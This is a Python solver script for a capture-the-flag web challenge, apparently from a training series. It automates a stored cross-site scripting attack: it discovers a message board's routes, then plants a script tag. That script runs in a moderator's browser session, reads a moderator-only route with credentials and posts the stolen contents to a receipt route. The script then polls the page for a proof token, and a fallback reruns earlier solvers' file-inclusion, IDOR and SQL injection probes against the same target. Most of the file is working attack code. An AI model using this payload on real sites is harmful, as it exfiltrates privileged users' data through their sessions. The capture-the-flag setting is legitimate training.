#!/usr/bin/env python3
"""Solver for this challenge -- harness skeleton. Fill in `answer()`; keep the I/O contract unchanged.

    solve.py --contract <contract.json> --artifacts <dir>   ->  prints {answer_id: value} as JSON on the last line

Runs on the Homebase VM inside a ~6-7 s window for EVERY Mastery set: stdlib + lib.* + pyzipper/pyelftools/pefile/
capstone/pycryptodome/androguard only, no subprocess to 7z/jadx/etc., all sets well under 1 s. Mastery questions name
their files like 'delivery 2: sample_02.apk' or 'evidence.zip -> member': `artifact_bytes()` resolves both (by sha256
pairing first, so same-named per-set deliveries never get mixed up)."""
import argparse
import json
import os
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
sys.path.insert(0, str(ROOT))
from lib.common import (container_by_sha, delivery_missing, find_artifact, group_by_set, load_contract,  # noqa: E402
                        normalize)

_cache = {}


def artifact_bytes(root, contract, artifact):
    """Bytes for a question's `artifact` string (cached per artifact)."""
    if artifact in _cache:
        return _cache[artifact]
    container, _, member = (x.strip() for x in artifact.partition("->"))
    data = None
    p = container_by_sha(root, contract, container)
    if p is not None and not member:
        data = p.read_bytes()
    elif not delivery_missing(root, contract, container):
        for cand in (artifact, container.split(": ", 1)[-1] + (f" -> {member}" if member else "")):
            try:
                data = find_artifact(root, cand)
                break
            except FileNotFoundError:
                continue
    _cache[artifact] = data
    return data


import re
import urllib.error
import urllib.parse
import urllib.request

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
PROOF = re.compile(r"proof_[0-9a-f]{32}")


def _target_url(question, contract):
    art = (question.get("artifact") or "").strip()
    ts = contract.get("targets") or []
    for t in ts:
        if (t.get("id") or "").strip().lower() == art.lower():
            return t.get("url")
    m = re.search(r"(\d+)", art)
    if m and ts and int(m.group(1)) - 1 < len(ts):
        return ts[int(m.group(1)) - 1].get("url")
    return ts[0].get("url") if len(ts) == 1 else None


def _req(url, data=None, timeout=6):
    hdr = {"User-Agent": UA}
    if data is not None:
        data = json.dumps(data).encode()
        hdr["Content-Type"] = "application/json"
    try:
        with urllib.request.urlopen(urllib.request.Request(url, data=data, headers=hdr), timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        return 0, ""


def _json(body):
    try:
        return json.loads(body)
    except Exception:  # noqa: BLE001
        return {}


def _routes(base):
    """(submit route, moderator-only data route, receipt template) from /api/clues, else /openapi.json."""
    clues = _json(_req(base + "api/clues")[1]) or {}
    paths = list((_json(_req(base + "openapi.json")[1]) or {}).get("paths", {}).items())
    data_r = clues.get("moderator_data_route") if isinstance(clues, dict) else None
    rcpt = clues.get("receipt_route_template") if isinstance(clues, dict) else None
    submit = None
    for p, ops in paths:
        if "post" in ops and "{" not in p and p.startswith("/api/"):
            submit = submit or p
        if not rcpt and "post" in ops and "{" in p and p != "/api/messages":
            rcpt = p
    if not data_r:
        for p, ops in paths:
            if "get" in ops and "{" not in p and p.strip("/") and not re.search(
                    r"healthz|time-trial|assets|api/clues|openapi|docs|^/$", p):
                if _req(base + p.lstrip("/"))[0] in (401, 403):
                    data_r = p
                    break
    return submit or "/api/messages", data_r, rcpt


def answer(answer_id, question, data, contract):
    """Stored XSS ('the reviewer opens it in a real browser'): plant a script that, in the moderator's session,
    reads the moderator-only route and POSTs it to this message's receipt route; the message page shows the
    receipt with the proof."""
    base = _target_url(question, contract)
    if not base:
        return None
    base = base if base.endswith("/") else base + "/"
    submit, data_r, rcpt = _routes(base)
    if not data_r or not rcpt:
        return None
    rc = json.dumps(re.sub(r"\{[^}]+\}", "@@ID@@", rcpt))
    js = ("<script>(async()=>{try{var i=location.pathname.match(/\\d+/g).pop();"
          "var t=await (await fetch(%s,{credentials:'include'})).text();"
          "await fetch(%s.replace('@@ID@@',i),{method:'POST',headers:{'Content-Type':'application/json'},"
          "credentials:'include',body:JSON.stringify({evidence:t,content:t,page:location.href})});}catch(e){}})()"
          "</script>") % (json.dumps(data_r), rc)
    st, body = _req(base + submit.lstrip("/"), {"message": js, "name": "guest"})
    j = _json(body) if st == 200 else {}
    mid, view = (j.get("id"), j.get("url")) if isinstance(j, dict) else (None, None)
    if not view and mid is not None:
        view = "/messages/%s" % mid
    if not view:
        return None
    t_end = time.time() + 12
    while time.time() < t_end and not _past_deadline():
        m = PROOF.search(_req(urllib.parse.urljoin(base, view))[1])
        if m:
            return m.group(0)
        time.sleep(0.4)
    return None


def fallback(answer_id, question, data, contract):
    """Mastery compounds earlier web days: try their solvers' answer() on the same target. answer() ONLY -- the
    sibling day-21 solvers' fallback() calls back into this one (unbounded recursion = timeout). D04's answer()
    already runs every D01-D04 probe (LFI/backup/IDOR/SQLi), ordered by the prompt's wording."""
    import importlib.util
    for d in ("day20/web-stay-in-your-directory", "day20/web-administratively-speaking", "day21/web-reflect-upon-this",
              "day21/web-session-impression"):
        if _past_deadline():
            break
        p = ROOT / "challenges" / d / "solver" / "solve.py"
        if not p.exists():
            continue
        try:
            spec = importlib.util.spec_from_file_location("prior_" + d.replace("/", "_").replace("-", "_"), p)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            v = mod.answer(answer_id, question, data, contract)
            if v:
                return v
        except Exception as e:  # noqa: BLE001
            print(f"{answer_id}: prior {d} {e!r}", file=sys.stderr)
    return None


def _past_deadline():
    """The timed runner's HCTF_SOLVE_DEADLINE (epoch) has passed: print the answers found so far instead."""
    try:
        return time.time() > float(os.environ["HCTF_SOLVE_DEADLINE"])
    except (KeyError, ValueError):
        return False


def _solve_pairs(job):
    """Answer one group of (answer_id, question) pairs -- a whole Mastery set, or the whole contract."""
    root, contract, pairs = job
    out = {}
    for aid, q in pairs:
        data = artifact_bytes(root, contract, q.get("artifact") or "")
        # Web probes are network-bound: run today's XSS answer() and the earlier-day probes (fallback) side by side;
        # answer()'s value wins, the fallback's is used only when answer() found nothing.
        from concurrent.futures import ThreadPoolExecutor
        ex = ThreadPoolExecutor(max_workers=2)
        fa = ex.submit(answer, aid, q, data, contract)
        fb = ex.submit(fallback, aid, q, data, contract)
        ex.shutdown(wait=False)
        try:
            v = fa.result()
        except Exception as e:  # noqa: BLE001 - one bad field must not sink the other answers
            print(f"{aid}: {e!r}", file=sys.stderr)
            v = None
        if v is None:
            try:
                v = fb.result()
            except Exception as e:  # noqa: BLE001
                print(f"{aid}: fallback {e!r}", file=sys.stderr)
        if v is not None:
            out[aid] = normalize(v, q)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--contract", required=True)
    ap.add_argument("--artifacts", required=True)
    a = ap.parse_args()
    contract, pairs = load_contract(a.contract)
    groups = group_by_set(pairs)
    out = {}
    if len(groups) >= 2 and os.environ.get("HCTF_SOLVER_PARALLEL", "1") != "0":
        # Mastery: every set runs inside ONE clock -- one forked process per set (the Homebase VM has 2 vCPUs; heavy
        # per-set work such as unzipping 31 MB deliveries halves). Same results as the sequential loop.
        import multiprocessing as mp
        from concurrent.futures import ProcessPoolExecutor
        try:
            with ProcessPoolExecutor(max_workers=min(len(groups), os.cpu_count() or 2),
                                     mp_context=mp.get_context("fork")) as ex:
                for part in ex.map(_solve_pairs, [(a.artifacts, contract, g) for g in groups.values()]):
                    out.update(part)
        except Exception as e:  # noqa: BLE001 - never lose a solve to the pool: fall back to sequential
            print(f"parallel sets failed ({e!r}); sequential", file=sys.stderr)
            out = _solve_pairs((a.artifacts, contract, pairs))
    else:
        out = _solve_pairs((a.artifacts, contract, pairs))
    print(json.dumps(out), flush=True)
    sys.stderr.flush()
    os._exit(0)   # don't wait on a still-probing fallback thread once the answers are printed


if __name__ == "__main__":
    main()
